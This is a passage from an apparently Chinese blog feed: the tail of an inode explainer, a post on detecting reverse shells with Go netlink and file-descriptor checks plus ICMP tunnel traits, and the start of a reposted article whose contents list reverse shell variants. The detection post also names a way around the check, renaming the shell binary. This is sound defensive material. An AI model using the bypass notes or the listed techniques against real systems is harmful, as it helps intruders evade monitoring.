&#x2F;etc</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120407.png" alt="img"></p><p>如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。</p><blockquote><p>　　ls -l &#x2F;etc</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120408.png" alt="img"></p><p>理解了上面这些知识，就能理解目录的权限。目录文件的读权限（r）和写权限（w），都是针对目录文件本身。由于目录文件内只有文件名和inode号码，所以如果只有读权限，只能获取文件名，无法获取其他信息，因为其他信息都储存在inode节点中，而读取inode节点内的信息需要目录文件的执行权限（x）。</p><h2 id="六、硬链接"><a href="#六、硬链接" class="headerlink" title="六、硬链接"></a><strong>六、硬链接</strong></h2><p>一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix&#x2F;Linux系统允许，多个文件名指向同一个inode号码。</p><p>这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。</p><p>ln命令可以创建硬链接：</p><blockquote><p>　　ln 源文件 目标文件</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120409.png" alt="img"></p><p>运行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做”链接数”，记录指向该inode的文件名总数，这时就会增加1。</p><p>反过来，删除一个文件名，就会使得inode节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个inode，系统就会回收这个inode号码，以及其所对应block区域。</p><p>这里顺便说一下目录文件的”链接数”。创建目录时，默认会生成两个目录项：”.”和”..”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）。</p><h2 id="七、软链接"><a href="#七、软链接" class="headerlink" title="七、软链接"></a><strong>七、软链接</strong></h2><p>除了硬链接以外，还有一种特殊情况。</p><p>文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。</p><p>这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。</p><p>ln -s命令可以创建软链接。</p><blockquote><p>　　ln -s 源文文件或目录 目标文件或目录</p></blockquote><p><img src="https://www.ruanyifeng.com/blogimg/asset/201112/bg2011120410.png" alt="img"></p><h2 id="八、inode的特殊作用"><a href="#八、inode的特殊作用" class="headerlink" title="八、inode的特殊作用"></a><strong>八、inode的特殊作用</strong></h2><p>由于inode号码与文件名分离，这种机制导致了一些Unix&#x2F;Linux系统特有的现象。</p><p>　　1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。</p><p>　　2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。</p><p>　　3. 打开一个文件以后，系统就以inode号码来识别这个文件，不再考虑文件名。因此，通常来说，系统无法从inode号码得知文件名。</p><p>第3点使得软件更新变得简单，可以在不关闭软件的情况下进行更新，不需要重启。因为系统通过inode号码，识别运行中的文件，不通过文件名。更新的时候，新版文件以同样的文件名，生成一个新的inode，不会影响到运行中的文件。等到下一次运行这个软件的时候，文件名就自动指向新版文件，旧版文件的inode则被回收。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
      <tag>操作系统</tag>
      
      <tag>文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>入侵检测——如何实现反弹shell检测？</title>
    <link href="/2023/02/05/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E6%A3%80%E6%B5%8B%EF%BC%9F/"/>
    <url>/2023/02/05/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E6%A3%80%E6%B5%8B%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="入侵检测——如何实现反弹shell检测？"><a href="#入侵检测——如何实现反弹shell检测？" class="headerlink" title="入侵检测——如何实现反弹shell检测？"></a>入侵检测——如何实现反弹shell检测？</h1><blockquote><p>反弹shell的本质：就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><p>反弹shell的结果：一个client上的bash进程 可以和 server上的进程通信。</p><p>而反弹shell的检测，本质上就是检测 shell进程（如bash）的输入输出是否来自于一个远程的server。</p></blockquote><h2 id="一、检测思路"><a href="#一、检测思路" class="headerlink" title="一、检测思路"></a>一、检测思路</h2><h2 id="1-进程-file-descriptor-异常检测"><a href="#1-进程-file-descriptor-异常检测" class="headerlink" title="1.进程 file descriptor 异常检测"></a>1.进程 file descriptor 异常检测</h2><h3 id="1-1-检测-file-descriptor-是否指向一个socket"><a href="#1-1-检测-file-descriptor-是否指向一个socket" class="headerlink" title="1.1 检测 file descriptor 是否指向一个socket"></a>1.1 检测 file descriptor 是否指向一个socket</h3><p>以“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong>。</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png" alt="img"></p><p> <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png" alt="img"> </p><h3 id="1-2-检测-file-descriptor-是否指向一个管道符（pipe）"><a href="#1-2-检测-file-descriptor-是否指向一个管道符（pipe）" class="headerlink" title="1.2 检测 file descriptor 是否指向一个管道符（pipe）"></a>1.2 检测 file descriptor 是否指向一个管道符（pipe）</h3><p>对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个pipe句柄</strong>。</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png" alt="img"></p><p>更进一步地说，不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。</p><p>我们只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。</p><p>例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险。 </p><h2 id="2-netlink监控-fd异常检测"><a href="#2-netlink监控-fd异常检测" class="headerlink" title="2.netlink监控+fd异常检测"></a>2.netlink监控+fd异常检测</h2><ul><li>监听Netlink Socket，实时获取进程EXEC事件。</li><li>如果为Shell进程，检查进程启动打开的FD，<ul><li>打开了Socket</li><li>未使用&#x2F;dev&#x2F;tty、&#x2F;dev&#x2F;pts&#x2F;n、&#x2F;dev&#x2F;ptmx等终端</li><li>则确认为反弹Shell</li></ul></li></ul><p><strong>绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法</strong>。</p><p>例如通过将&#x2F;bin&#x2F;sh重命名为其他名字进行反弹shell。</p><h2 id="3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测"><a href="#3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测" class="headerlink" title="3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测"></a>3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</h2><p>需要注意的是，操作系统是分层的，Bash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：</p><ul><li>python&#x2F;perl实现纯代码形式的反弹shell文件执行：文件脚本检测</li><li>python&#x2F;perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测</li><li>C&#x2F;C++实现纯代码形式的反弹shell：二进制文件检测</li></ul><h2 id="4-特征检测"><a href="#4-特征检测" class="headerlink" title="4. 特征检测"></a>4. 特征检测</h2><h4 id="4-1网络层反弹shell通信特征检测"><a href="#4-1网络层反弹shell通信特征检测" class="headerlink" title="4.1网络层反弹shell通信特征检测"></a>4.1网络层反弹shell通信特征检测</h4><p>反弹shell的通信会话中，会包含一些”cmdline shell特征“，例如”#root….“等，可以在网络侧进行NTA实时检测。</p><h4 id="4-2DNS反弹shell特征检测"><a href="#4-2DNS反弹shell特征检测" class="headerlink" title="4.2DNS反弹shell特征检测"></a>4.2DNS反弹shell特征检测</h4><p>针对DNS流量进行分析，判断关联进程是否开启&#x2F;dev&#x2F;net&#x2F;tun，或者&#x2F;dev&#x2F;net&#x2F;tap隧道等等。</p><h4 id="4-3-ICMP反弹shell特征检测"><a href="#4-3-ICMP反弹shell特征检测" class="headerlink" title="4.3 ICMP反弹shell特征检测"></a>4.3 ICMP反弹shell特征检测</h4><p>对于正常的ping命令产生的数据，有以下特点：</p><p>● 每秒发送的数据包个数比较少，通常每秒最多只会发送两个数据包；</p><p>● 请求数据包与对应的响应数据包内容一样；</p><p>● 数据包中payload的大小固定，windows下为32bytes，linux下为48bytes；</p><p>● 数据包中payload的内容固定，windows下为abcdefghijklmnopqrstuvwabcdefghi，linux下为!”#$%&amp;’()+,-.&#x2F;01234567，如果指定ping发送的长度，则为不断重复的固定字符串；</p><p>● type类型只有2种，0和8。0为请求数据，8为响应数据。</p><p>对于ICMP隧道产生的数据，有以下特点：</p><p>● 每秒发送的数据包个数比较多，在同一时间会产生成百上千个 ICMP 数据包；</p><p>● 请求数据包与对应的响应数据包内容不一样；</p><p>● 数据包中 payload的大小可以是任意大小；</p><p>● 存在一些type为13&#x2F;15&#x2F;17的带payload的畸形数据包；</p><p>● 个别ICMP隧道工具产生的数据包内容前面会增加 ‘TUNL’ 标记以用于识别隧道。</p><p>因此，根据正常ping和ICMP隧道产生的数据包的特点，可以通过以下几点特征检测ICMP隧道:</p><p>● 检测同一来源数据包的数量。正常ping每秒只会发送2个数据包，而ICMP隧道可以每秒发送很多个；</p><p>● 检测数据包中 payload 的大小。正常ping产生的数据包payload的大小为固定，而ICMP隧道数据包大小可以任意；</p><p>● 检测响应数据包中 payload 跟请求数据包是否不一致。正常ping产生的数据包请求响应内容一致，而ICMP隧道请求响应数据包可以一致，也可以不一致；</p><p>● 检测数据包中 payload 的内容。正常ping产生的payload为固定字符串，ICMP隧道的payload可以为任意；</p><p>● 检测 ICMP 数据包的type是否为0和8。正常ping产生的带payload的数据包，type只有0和8，ICMP隧道的type可以为13&#x2F;15&#x2F;17。</p><p><img src="https://blog.riskivy.com/wp-content/uploads/2019/04/p6.png" alt="图片名称"></p><p>具体实现可参考<a href="https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E7%9A%84icmp%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/">https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E7%9A%84icmp%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/</a></p><h2 id="二、具体实现举例"><a href="#二、具体实现举例" class="headerlink" title="二、具体实现举例"></a>二、具体实现举例</h2><h3 id="1-监听Netlink-Socket-并轮询处理"><a href="#1-监听Netlink-Socket-并轮询处理" class="headerlink" title="1.监听Netlink Socket 并轮询处理"></a>1.监听Netlink Socket 并轮询处理</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ns *NetlinkSocket)</span></span> ReceiveFrom() ([]syscall.NetlinkMessage, syscall.Sockaddr, <span class="hljs-type">error</span>) &#123;<br>nr, from, err := syscall.Recvfrom(ns.fd, ns.buf, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, from, err<br>&#125;<br><span class="hljs-keyword">if</span> nr &lt; syscall.NLMSG_HDRLEN &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, from, fmt.Errorf(<span class="hljs-string">&quot;Got short response from netlink&quot;</span>)<br>&#125;<br><br>msg, err := syscall.ParseNetlinkMessage(ns.buf[:nr])<br><span class="hljs-keyword">return</span> msg, from, err<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-实时处理进程EXEC事件"><a href="#2-实时处理进程EXEC事件" class="headerlink" title="2.实时处理进程EXEC事件"></a>2.实时处理进程EXEC事件</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Probe)</span></span> netLinkHandler(e *netlinkProcEvent) &#123;<br><span class="hljs-keyword">switch</span> e.Event &#123;<br><span class="hljs-keyword">case</span> netlink.PROC_EVENT_EXEC:<br>p.handleProcExec(e.Pid, <span class="hljs-literal">false</span>) <span class="hljs-comment">// pid</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-根据反弹shell的基本原理，判断进程-file-descriptor-是否异常"><a href="#3-根据反弹shell的基本原理，判断进程-file-descriptor-是否异常" class="headerlink" title="3.根据反弹shell的基本原理，判断进程 file descriptor 是否异常"></a>3.根据反弹shell的基本原理，判断进程 file descriptor 是否异常</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//根据反弹shell的基本原理，判断进程 file descriptor 是否异常（也就是是否相等）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Probe)</span></span> checkReverseShell(pid <span class="hljs-type">int</span>)  &#123;<br>    <span class="hljs-comment">//获取对应的inode</span><br>   inodeStdin, err := osutil.GetFDSocketInode(pid, <span class="hljs-number">0</span>)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>   &#125;<br>   inodeStdout, err := osutil.GetFDSocketInode(pid, <span class="hljs-number">1</span>)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>   &#125;<br>   <span class="hljs-keyword">if</span> inodeStdin != inodeStdout || inodeStdin == <span class="hljs-number">0</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>   &#125;<br>   <span class="hljs-keyword">return</span> osutil.GetProcessConnection(pid, <span class="hljs-literal">nil</span>, utils.NewSet(inodeStdin))<br>&#125;<br><br><span class="hljs-comment">//获取进程对应的连接</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetProcessConnection</span><span class="hljs-params">(pid <span class="hljs-type">int</span>, clientPort *share.CLUSProtoPort, inodes utils.Set)</span></span> *Connection &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-keyword">if</span> inodes == <span class="hljs-literal">nil</span> &#123;<br>inodes, err = GetProcessSocketInodes(pid)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> inodes.Cardinality() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">var</span> sport <span class="hljs-type">uint16</span><br><span class="hljs-keyword">if</span> clientPort != <span class="hljs-literal">nil</span> &#123;<br>sport = clientPort.Port<br>&#125;<br>pidDir := global.SYS.ContainerProcFilePath(pid, <span class="hljs-string">&quot;/&quot;</span>)<br><span class="hljs-keyword">if</span> clientPort == <span class="hljs-literal">nil</span> || clientPort.IPProto == syscall.IPPROTO_TCP &#123;<br><span class="hljs-keyword">if</span> conn := getConnectionByFile(pidDir+<span class="hljs-string">&quot;net/tcp&quot;</span>, inodes, <span class="hljs-literal">true</span>, sport); conn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn<br>&#125;<br><span class="hljs-keyword">if</span> conn := getConnectionByFile(pidDir+<span class="hljs-string">&quot;net/tcp6&quot;</span>, inodes, <span class="hljs-literal">true</span>, sport); conn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> clientPort == <span class="hljs-literal">nil</span> || clientPort.IPProto == syscall.IPPROTO_UDP &#123;<br><span class="hljs-keyword">if</span> conn := getConnectionByFile(pidDir+<span class="hljs-string">&quot;net/udp&quot;</span>, inodes, <span class="hljs-literal">false</span>, sport); conn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn<br>&#125;<br><span class="hljs-keyword">if</span> conn := getConnectionByFile(pidDir+<span class="hljs-string">&quot;net/udp6&quot;</span>, inodes, <span class="hljs-literal">false</span>, sport); conn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> conn<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>以上方式的缺点为：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法</strong>。</p><p>除此以外，还可以对特定场景进行分析，进程对应的fd是否异常并且外联，开源代码可参考：<a href="https://github.com/zhanghaoyil/seesaw%EF%BC%9B">https://github.com/zhanghaoyil/seesaw；</a></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>这篇文章主要介绍了常见的反弹shell检测思路，以及实现举例，欢迎大家进行补充与分享！</p><h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><ol><li><a href="https://home.cnblogs.com/u/LittleHann/">郑瀚Andrew</a>的 <a href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>linux</tag>
      
      <tag>安全</tag>
      
      <tag>容器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>入侵检测——反弹Shell原理以及常见检测技术</title>
    <link href="/2023/02/04/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%8F%8D%E5%BC%B9Shell%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/02/04/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%8F%8D%E5%BC%B9Shell%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="入侵检测——反弹Shell原理以及常见检测技术"><a href="#入侵检测——反弹Shell原理以及常见检测技术" class="headerlink" title="入侵检测——反弹Shell原理以及常见检测技术"></a>入侵检测——反弹Shell原理以及常见检测技术</h1><blockquote><p>主要内容转载自  <a href="https://home.cnblogs.com/u/LittleHann/">郑瀚Andrew</a>的 <a href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究</a></p></blockquote><p><strong>目录(Content)</strong></p><ul><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label0">1. 反弹Shell的概念本质</a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label1">2. 网络通信（network api）方式讨论</a></p></li><li><ul><li><p>[0x1：&#x2F;dev&#x2F;<a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_0">tcp|udp]【4层协议】</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_0">1. 从文件描述（file descriptor）符说起</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_1_0_1">2. 重定向</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">0x2：通过建立socket tcp连接实现网络通信【4层协议】 </a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_2">0x3：使用ICMP实现网络通信【4层协议】</a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_3">0x4：使用DNS实现网络通信【7层协议】</a></p></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label2">3. 命令执行（system executor）方式讨论</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_0">0x1：通过管道符传递指令</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_1">0x2：通过调用glibc api执行系统指令</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_2_2">0x3：通过直接调用系统调用执行指令</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3">4. 反弹Shell攻击组合方式讨论</a></p></li><li><ul><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_0">0x1：“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell</a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_1">0x2：第三方软件内置“socket通信”+“指令交互”实现反弹shel功能</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_0">1. nc</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_1">2. telnet反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_2">3. socat反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_1_3">4. Xterm </a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_2">0x3：“管道符”+ “socket网络通信”实现bash反弹shell</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_0">1. 基于匿名管道（pipe）传递指令流</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_2_1">2. 基于命名管道（fifo）</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_3">0x4：git解释性脚本语言反弹shell</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_0">1. python反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_1">2. perl反弹shell </a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_2">3. ruby反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_3">4. go反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_4">6. lua反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_5">7. java</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_6">8. gawk</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_7">9. powershell反弹shell</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_3_8">10. regsvr32反弹shell</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_4">0x5：msf生成payload反弹shell</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_0">1. 生成脚本解释型代码并执行</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_1">2. 生成编译型二进制文件并执行</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_2">3. 内存shellcode执行</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_3_4_3">4. 通过dll进程注入执行反弹shell</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_3_5">0x6：dns_shell &amp; icmp_shell</a></p></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label4">5. 反弹Shell检测思路</a></p></li><li><ul><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_0">0x1：进程 file descriptor 异常检测</a></p></li><li><ul><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_0">1. 检测 file descriptor 是否指向一个socket</a></li><li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_label3_4_0_1">1. 检测 file descriptor 是否指向一个管道符（pipe）</a></li></ul></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_1">0x3：netlink监控+fd异常检测</a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_2">0x4：脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</a></p></li><li><p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_4_3">0x5：网络层反弹shell通信特征检测</a></p></li></ul></li></ul><h1 id="1-反弹Shell的概念"><a href="#1-反弹Shell的概念" class="headerlink" title="1. 反弹Shell的概念"></a>1. 反弹Shell的概念</h1><p><strong>反弹shell的本质</strong>：就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p><p><strong>反弹shell的结果</strong>：一个client上的bash进程 可以和 server上的进程通信。</p><p><strong>而反弹shell的检测，本质上就是检测 shell进程（如bash）的输入输出是否来自于一个远程的server。</strong></p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215220831022-201658057.png" alt="img"></p><h1 id="2-网络通信（network-api）方式讨论"><a href="#2-网络通信（network-api）方式讨论" class="headerlink" title="2. 网络通信（network api）方式讨论"></a>2. 网络通信（network api）方式讨论</h1><h2 id="0x1：-x2F-dev-x2F-tcp-udp-【4层协议】"><a href="#0x1：-x2F-dev-x2F-tcp-udp-【4层协议】" class="headerlink" title="0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】"></a>0x1：&#x2F;dev&#x2F;[tcp|udp]【4层协议】</h2><h3 id="1-从文件描述（file-descriptor）符说起"><a href="#1-从文件描述（file-descriptor）符说起" class="headerlink" title="1. 从文件描述（file descriptor）符说起"></a>1. 从文件描述（file descriptor）符说起</h3><p>linux文件描述符可以理解为<strong>linux跟踪打开文件而分配的一个数字句柄</strong>，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。</p><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><ul><li>标准输入：standard input 0 （默认设备键盘）</li><li>标准输出：standard output 1（默认设备显示器）</li><li>错误输出：error output 2（默认设备显示器）</li></ul><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191214103946845-1739367665.png" alt="img"></p><h3 id="注意："><a href="#注意：" class="headerlink" 